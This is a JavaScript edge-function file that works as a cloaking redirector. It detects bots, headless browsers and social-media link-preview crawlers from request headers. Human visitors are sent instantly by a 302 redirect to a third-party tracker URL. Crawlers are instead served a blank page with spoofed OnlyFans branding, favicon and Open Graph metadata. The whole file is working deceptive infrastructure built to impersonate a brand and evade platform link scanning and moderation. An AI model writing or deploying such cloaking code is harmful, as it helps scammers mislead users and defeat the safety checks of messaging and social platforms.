export async function onRequest(context) {

  const request = context.request;
  const headers = request.headers;
  const ua = headers.get("user-agent") || "";
  const accept = headers.get("accept") || "";
  const secFetch = headers.get("sec-fetch-dest") || "";

  const url = new URL(request.url);
  const target = "https://tracker.statis.click/lord?sub_id=LORD_BAR_2";

  // === BOT / HEADLESS DETECTION ===

  const botUA =
    /bot|crawler|spider|crawling|facebook|whatsapp|telegram|twitter|slack|discord|headless/i.test(ua);

  const suspiciousAccept =
    !accept.includes("text/html");

  const missingSecFetch =
    !secFetch;

  const isBot = botUA || suspiciousAccept || missingSecFetch;

  // === USER → REDIRECT INSTANT ===
  if (!isBot) {
    return Response.redirect(target, 302);
  }

  // === BOT → SHOW META ONLY ===
  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>OnlyFans</title>

<link rel="icon" href="https://onlyfans.com/favicon.ico" type="image/x-icon">
<link rel="shortcut icon" href="https://onlyfans.com/favicon.ico" type="image/x-icon">

<meta name="description" content="Discover exclusive content and connect with your favorite creators.">

<meta property="og:title" content="OnlyFans">
<meta property="og:site_name" content="OnlyFans">
<meta property="og:description" content="Discover exclusive content and connect with your favorite creators.">
<meta property="og:image" content="https://static.android.com.pl/uploads/2021/08/OnlyFans.jpg">
<meta property="og:url" content="${url.href}">
<meta property="og:type" content="website">

<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="OnlyFans">
<meta name="twitter:description" content="Discover exclusive content and connect with your favorite creators.">
<meta name="twitter:image" content="https://static.android.com.pl/uploads/2021/08/OnlyFans.jpg">

</head>
<body></body>
</html>`;

  return new Response(html, {
    headers: {
      "content-type": "text/html;charset=UTF-8",
      "cache-control": "no-store"
    }
  });

}
